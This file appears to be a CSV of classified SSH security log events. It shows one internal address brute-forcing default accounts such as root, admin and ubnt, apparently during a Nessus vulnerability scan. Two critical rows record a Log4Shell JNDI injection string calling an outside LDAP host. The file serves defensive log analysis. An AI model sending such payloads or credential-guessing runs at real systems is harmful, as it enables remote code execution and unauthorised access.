source,timestamp,severity,ip,dest_ip,threat_type,details,category
SSH Logs,Jan 21 06:57:37,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by 192.168.0.15 port 47070,
SSH Logs,Jan 21 06:57:39,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by 192.168.0.15 port 47082 [preauth],
SSH Logs,Jan 21 06:58:01,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by 192.168.0.15 port 47154,
SSH Logs,Jan 21 06:58:11,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by 192.168.0.15 port 47174,
SSH Logs,Jan 21 07:08:37,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user n3ssus from 192.168.0.15 port 51676,
SSH Logs,Jan 21 07:08:37,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user n3ssus 192.168.0.15 port 51676 [preauth],
SSH Logs,Jan 21 07:08:38,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by 192.168.0.15 port 51692,
SSH Logs,Jan 21 07:08:39,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by 192.168.0.15 port 51696 [preauth],
SSH Logs,Jan 21 07:08:41,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user anonymous from 192.168.0.15 port 51698,
SSH Logs,Jan 21 07:08:43,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by 192.168.0.15 port 51722 [preauth],
SSH Logs,Jan 21 07:08:43,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user anonymous from 192.168.0.15 port 51698 ssh2,
SSH Logs,Jan 21 07:08:45,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by 192.168.0.15 port 51736 [preauth],
SSH Logs,Jan 21 07:08:45,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user anonymous 192.168.0.15 port 51698 [preauth],
SSH Logs,Jan 21 07:08:47,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user guest from 192.168.0.15 port 51740,
SSH Logs,Jan 21 07:08:48,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user  from 192.168.0.15 port 51744,
SSH Logs,Jan 21 07:08:48,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user  192.168.0.15 port 51744 [preauth],
SSH Logs,Jan 21 07:08:48,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 51746,
SSH Logs,Jan 21 07:08:49,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user guest from 192.168.0.15 port 51740 ssh2,
SSH Logs,Jan 21 07:08:50,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 51746 ssh2,
SSH Logs,Jan 21 07:08:51,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 51746 [preauth],
SSH Logs,Jan 21 07:08:51,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user guest 192.168.0.15 port 51740 [preauth],
SSH Logs,Jan 21 07:08:52,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 51764,
SSH Logs,Jan 21 07:08:53,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 51768,
SSH Logs,Jan 21 07:08:53,HIGH,192.168.0.15,,SSH_failed_password,Failed password for root from 192.168.0.15 port 51752 ssh2,
SSH Logs,Jan 21 07:08:54,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by authenticating user root 192.168.0.15 port 51752 [preauth],
SSH Logs,Jan 21 07:08:55,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 51764 ssh2,
SSH Logs,Jan 21 07:08:55,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 51768 ssh2,
SSH Logs,Jan 21 07:08:56,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by authenticating user root 192.168.0.15 port 51776 [preauth],
SSH Logs,Jan 21 07:08:56,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 51764 [preauth],
SSH Logs,Jan 21 07:08:57,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 51768 [preauth],
SSH Logs,Jan 21 07:08:58,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user product from 192.168.0.15 port 51790,
SSH Logs,Jan 21 07:09:01,HIGH,192.168.0.15,,SSH_failed_password,Failed password for root from 192.168.0.15 port 51796 ssh2,
SSH Logs,Jan 21 07:09:01,HIGH,192.168.0.15,,SSH_failed_password,Failed password for root from 192.168.0.15 port 51792 ssh2,
SSH Logs,Jan 21 07:09:01,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user product from 192.168.0.15 port 51790 ssh2,
SSH Logs,Jan 21 07:09:02,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by authenticating user root 192.168.0.15 port 51792 [preauth],
SSH Logs,Jan 21 07:09:02,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by authenticating user root 192.168.0.15 port 51796 [preauth],
SSH Logs,Jan 21 07:09:03,CRITICAL,192.168.0.15,,SSH_log4shell_attempt,Unable to negotiate with 192.168.0.15 port 51816: no matching key exchange method found. Their offer: ${jndi:ldap://log4shell-ssh-de4UwmZGNkf4dklEmw2V...,
SSH Logs,Jan 21 07:09:03,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user product 192.168.0.15 port 51790 [preauth],
SSH Logs,Jan 21 07:09:04,CRITICAL,192.168.0.15,,SSH_log4shell_attempt,Disconnecting 192.168.0.15 port 51824: bad service request ${jndi:ldap://log4shell-ssh-de4UwmZGNkf4dklEmw2V${lower:ten}.w.nessus.org/nessus [preauth],
SSH Logs,Jan 21 07:09:05,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user emailswitch from 192.168.0.15 port 51826,
SSH Logs,Jan 21 07:09:06,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user nessus from 192.168.0.15 port 51832,
SSH Logs,Jan 21 07:09:07,HIGH,192.168.0.15,,SSH_failed_password,Failed password for root from 192.168.0.15 port 51818 ssh2,
SSH Logs,Jan 21 07:09:08,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user emailswitch from 192.168.0.15 port 51826 ssh2,
SSH Logs,Jan 21 07:09:08,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by authenticating user root 192.168.0.15 port 51818 [preauth],
SSH Logs,Jan 21 07:09:08,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user nessus from 192.168.0.15 port 51838,
SSH Logs,Jan 21 07:09:10,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user dpnod_eh from 192.168.0.15 port 51842,
SSH Logs,Jan 21 07:09:10,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user nessus from 192.168.0.15 port 51852,
SSH Logs,Jan 21 07:09:10,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user emailswitch 192.168.0.15 port 51826 [preauth],
SSH Logs,Jan 21 07:09:12,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user ${jndi from 192.168.0.15 port 51856,
SSH Logs,Jan 21 07:09:12,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user dpnod_eh from 192.168.0.15 port 51842 ssh2,
SSH Logs,Jan 21 07:09:14,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user ${jndi from 192.168.0.15 port 51856 ssh2,
SSH Logs,Jan 21 07:09:15,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user dpnod_eh 192.168.0.15 port 51842 [preauth],
SSH Logs,Jan 21 07:09:17,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user wEnJ52v_ from 192.168.0.15 port 51876,
SSH Logs,Jan 21 07:09:17,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user ${jndi 192.168.0.15 port 51856 [preauth],
SSH Logs,Jan 21 07:09:17,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user wEnJ52v_ 192.168.0.15 port 51876 [preauth],
SSH Logs,Jan 21 07:09:19,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user rUGJkMAj from 192.168.0.15 port 51882,
SSH Logs,Jan 21 07:09:21,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user rUGJkMAj from 192.168.0.15 port 51882 ssh2,
SSH Logs,Jan 21 07:09:22,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user rUGJkMAj 192.168.0.15 port 51882 [preauth],
SSH Logs,Jan 21 07:09:23,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user PrFjXHbc from 192.168.0.15 port 51900,
SSH Logs,Jan 21 07:09:24,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user PrFjXHbc 192.168.0.15 port 51900 [preauth],
SSH Logs,Jan 21 07:09:26,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 51906,
SSH Logs,Jan 21 07:09:28,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 51906 ssh2,
SSH Logs,Jan 21 07:09:28,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user 1234 from 192.168.0.15 port 51920,
SSH Logs,Jan 21 07:09:29,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user netscreen from 192.168.0.15 port 51922,
SSH Logs,Jan 21 07:09:30,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 51906 [preauth],
SSH Logs,Jan 21 07:09:31,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user 1234 from 192.168.0.15 port 51920 ssh2,
SSH Logs,Jan 21 07:09:31,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user netscreen from 192.168.0.15 port 51922 ssh2,
SSH Logs,Jan 21 07:09:31,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user netscreen 192.168.0.15 port 51922 [preauth],
SSH Logs,Jan 21 07:09:32,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin1 from 192.168.0.15 port 51932,
SSH Logs,Jan 21 07:09:32,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user 1234 192.168.0.15 port 51920 [preauth],
SSH Logs,Jan 21 07:09:33,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user manage from 192.168.0.15 port 51936,
SSH Logs,Jan 21 07:09:34,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin1 from 192.168.0.15 port 51932 ssh2,
SSH Logs,Jan 21 07:09:34,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user 11111 from 192.168.0.15 port 51948,
SSH Logs,Jan 21 07:09:35,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin1 192.168.0.15 port 51932 [preauth],
SSH Logs,Jan 21 07:09:36,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user manage from 192.168.0.15 port 51936 ssh2,
SSH Logs,Jan 21 07:09:37,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 51954,
SSH Logs,Jan 21 07:09:37,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user 11111 from 192.168.0.15 port 51948 ssh2,
SSH Logs,Jan 21 07:09:38,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user manage 192.168.0.15 port 51936 [preauth],
SSH Logs,Jan 21 07:09:39,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 51954 ssh2,
SSH Logs,Jan 21 07:09:39,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user 11111 192.168.0.15 port 51948 [preauth],
SSH Logs,Jan 21 07:09:39,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 51954 [preauth],
SSH Logs,Jan 21 07:09:40,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user manage from 192.168.0.15 port 51960,
SSH Logs,Jan 21 07:09:41,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user aaa from 192.168.0.15 port 51972,
SSH Logs,Jan 21 07:09:41,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 51974,
SSH Logs,Jan 21 07:09:42,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user manage from 192.168.0.15 port 51960 ssh2,
SSH Logs,Jan 21 07:09:44,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 51974 ssh2,
SSH Logs,Jan 21 07:09:44,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user aaa from 192.168.0.15 port 51972 ssh2,
SSH Logs,Jan 21 07:09:44,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user manage 192.168.0.15 port 51960 [preauth],
SSH Logs,Jan 21 07:09:45,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 51974 [preauth],
SSH Logs,Jan 21 07:09:46,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user aaa 192.168.0.15 port 51972 [preauth],
SSH Logs,Jan 21 07:09:46,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user monitor from 192.168.0.15 port 51994,
SSH Logs,Jan 21 07:09:47,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 52010,
SSH Logs,Jan 21 07:09:49,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user monitor from 192.168.0.15 port 51994 ssh2,
SSH Logs,Jan 21 07:09:49,HIGH,192.168.0.15,,SSH_failed_password,Failed password for root from 192.168.0.15 port 52008 ssh2,
SSH Logs,Jan 21 07:09:50,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 52010 ssh2,
SSH Logs,Jan 21 07:09:50,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by authenticating user root 192.168.0.15 port 52008 [preauth],
SSH Logs,Jan 21 07:09:51,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 52010 [preauth],
SSH Logs,Jan 21 07:09:52,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user monitor 192.168.0.15 port 51994 [preauth],
SSH Logs,Jan 21 07:09:52,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user shelladmin from 192.168.0.15 port 52020,
SSH Logs,Jan 21 07:09:53,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 52032,
SSH Logs,Jan 21 07:09:54,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user monitor from 192.168.0.15 port 52034,
SSH Logs,Jan 21 07:09:55,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user shelladmin from 192.168.0.15 port 52020 ssh2,
SSH Logs,Jan 21 07:09:55,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user monitor from 192.168.0.15 port 52034 ssh2,
SSH Logs,Jan 21 07:09:56,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 52032 ssh2,
SSH Logs,Jan 21 07:09:57,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user monitor 192.168.0.15 port 52034 [preauth],
SSH Logs,Jan 21 07:09:57,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user shelladmin 192.168.0.15 port 52020 [preauth],
SSH Logs,Jan 21 07:09:57,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 52032 [preauth],
SSH Logs,Jan 21 07:09:58,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user ftp from 192.168.0.15 port 52044,
SSH Logs,Jan 21 07:09:59,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user wank from 192.168.0.15 port 52056,
SSH Logs,Jan 21 07:09:59,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 52060,
SSH Logs,Jan 21 07:10:01,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user ftp from 192.168.0.15 port 52044 ssh2,
SSH Logs,Jan 21 07:10:02,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user wank from 192.168.0.15 port 52056 ssh2,
SSH Logs,Jan 21 07:10:02,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 52060 ssh2,
SSH Logs,Jan 21 07:10:03,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 52060 [preauth],
SSH Logs,Jan 21 07:10:03,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user wank 192.168.0.15 port 52056 [preauth],
SSH Logs,Jan 21 07:10:04,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user ftp 192.168.0.15 port 52044 [preauth],
SSH Logs,Jan 21 07:10:05,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 52080,
SSH Logs,Jan 21 07:10:05,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user user from 192.168.0.15 port 52082,
SSH Logs,Jan 21 07:10:05,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user ftp from 192.168.0.15 port 52084,
SSH Logs,Jan 21 07:10:08,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 52080 ssh2,
SSH Logs,Jan 21 07:10:08,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user user from 192.168.0.15 port 52082 ssh2,
SSH Logs,Jan 21 07:10:08,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user ftp from 192.168.0.15 port 52084 ssh2,
SSH Logs,Jan 21 07:10:09,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 52080 [preauth],
SSH Logs,Jan 21 07:10:09,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user user 192.168.0.15 port 52082 [preauth],
SSH Logs,Jan 21 07:10:10,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user ftp 192.168.0.15 port 52084 [preauth],
SSH Logs,Jan 21 07:10:11,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 52102,
SSH Logs,Jan 21 07:10:11,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user user from 192.168.0.15 port 52104,
SSH Logs,Jan 21 07:10:12,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user user from 192.168.0.15 port 52108,
SSH Logs,Jan 21 07:10:14,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 52102 ssh2,
SSH Logs,Jan 21 07:10:14,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user ucspe from 192.168.0.15 port 52112,
SSH Logs,Jan 21 07:10:14,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user user from 192.168.0.15 port 52108 ssh2,
SSH Logs,Jan 21 07:10:14,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user user from 192.168.0.15 port 52104 ssh2,
SSH Logs,Jan 21 07:10:14,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user user 192.168.0.15 port 52108 [preauth],
SSH Logs,Jan 21 07:10:15,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 52102 [preauth],
SSH Logs,Jan 21 07:10:15,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user user 192.168.0.15 port 52104 [preauth],
SSH Logs,Jan 21 07:10:16,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user ucspe from 192.168.0.15 port 52112 ssh2,
SSH Logs,Jan 21 07:10:16,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user ubnt from 192.168.0.15 port 52116,
SSH Logs,Jan 21 07:10:17,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 52118,
SSH Logs,Jan 21 07:10:17,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user tutor from 192.168.0.15 port 52128,
SSH Logs,Jan 21 07:10:17,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user ucspe 192.168.0.15 port 52112 [preauth],
SSH Logs,Jan 21 07:10:17,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user tutor 192.168.0.15 port 52128 [preauth],
SSH Logs,Jan 21 07:10:19,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user trans from 192.168.0.15 port 52130,
SSH Logs,Jan 21 07:10:19,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user toor from 192.168.0.15 port 52132,
SSH Logs,Jan 21 07:10:19,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 52118 ssh2,
SSH Logs,Jan 21 07:10:19,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user ubnt from 192.168.0.15 port 52116 ssh2,
SSH Logs,Jan 21 07:10:19,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user toor 192.168.0.15 port 52132 [preauth],
SSH Logs,Jan 21 07:10:20,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user ubnt 192.168.0.15 port 52116 [preauth],
SSH Logs,Jan 21 07:10:20,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user trans from 192.168.0.15 port 52130 ssh2,
SSH Logs,Jan 21 07:10:21,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 52118 [preauth],
SSH Logs,Jan 21 07:10:21,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user trans 192.168.0.15 port 52130 [preauth],
SSH Logs,Jan 21 07:10:21,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user tech from 192.168.0.15 port 52134,
SSH Logs,Jan 21 07:10:22,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user system from 192.168.0.15 port 52136,
SSH Logs,Jan 21 07:10:23,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 52138,
SSH Logs,Jan 21 07:10:23,LOW,192.168.0.15,,SSH_connection_reset,Connection reset by authenticating user sync 192.168.0.15 port 52140 [preauth],
SSH Logs,Jan 21 07:10:24,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user tech from 192.168.0.15 port 52134 ssh2,
SSH Logs,Jan 21 07:10:25,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user system from 192.168.0.15 port 52136 ssh2,
SSH Logs,Jan 21 07:10:25,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user swift from 192.168.0.15 port 52150,
SSH Logs,Jan 21 07:10:25,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user tech 192.168.0.15 port 52134 [preauth],
SSH Logs,Jan 21 07:10:25,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 52138 ssh2,
SSH Logs,Jan 21 07:10:26,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user system 192.168.0.15 port 52136 [preauth],
SSH Logs,Jan 21 07:10:27,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 52138 [preauth],
SSH Logs,Jan 21 07:10:27,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user support from 192.168.0.15 port 52152,
SSH Logs,Jan 21 07:10:27,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user swift from 192.168.0.15 port 52150 ssh2,
SSH Logs,Jan 21 07:10:28,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user supervisor from 192.168.0.15 port 52154,
SSH Logs,Jan 21 07:10:28,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 52156,
SSH Logs,Jan 21 07:10:29,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user swift 192.168.0.15 port 52150 [preauth],
SSH Logs,Jan 21 07:10:29,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user support from 192.168.0.15 port 52152 ssh2,
SSH Logs,Jan 21 07:10:30,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user support 192.168.0.15 port 52152 [preauth],
SSH Logs,Jan 21 07:10:31,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user supervisor from 192.168.0.15 port 52154 ssh2,
SSH Logs,Jan 21 07:10:31,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 52156 ssh2,
SSH Logs,Jan 21 07:10:31,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user superuser from 192.168.0.15 port 52166,
SSH Logs,Jan 21 07:10:31,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user supervisor 192.168.0.15 port 52154 [preauth],
SSH Logs,Jan 21 07:10:32,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user super from 192.168.0.15 port 52168,
SSH Logs,Jan 21 07:10:32,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 52156 [preauth],
SSH Logs,Jan 21 07:10:32,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user superuser from 192.168.0.15 port 52166 ssh2,
SSH Logs,Jan 21 07:10:33,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user superuser 192.168.0.15 port 52166 [preauth],
SSH Logs,Jan 21 07:10:33,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user super from 192.168.0.15 port 52170,
SSH Logs,Jan 21 07:10:34,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user super from 192.168.0.15 port 52168 ssh2,
SSH Logs,Jan 21 07:10:34,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user admin from 192.168.0.15 port 52172,
SSH Logs,Jan 21 07:10:34,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user super 192.168.0.15 port 52168 [preauth],
SSH Logs,Jan 21 07:10:35,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user splunkadmin from 192.168.0.15 port 52174,
SSH Logs,Jan 21 07:10:35,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user super from 192.168.0.15 port 52170 ssh2,
SSH Logs,Jan 21 07:10:36,MEDIUM,192.168.0.15,,SSH_invalid_user,Invalid user service from 192.168.0.15 port 52184,
SSH Logs,Jan 21 07:10:37,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user admin from 192.168.0.15 port 52172 ssh2,
SSH Logs,Jan 21 07:10:37,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user super 192.168.0.15 port 52170 [preauth],
SSH Logs,Jan 21 07:10:38,MEDIUM,192.168.0.15,,SSH_invalid_user,Failed password for invalid user splunkadmin from 192.168.0.15 port 52174 ssh2,
SSH Logs,Jan 21 07:10:38,MEDIUM,192.168.0.15,,SSH_invalid_user,Connection reset by invalid user admin 192.168.0.15 port 52172 [preauth],
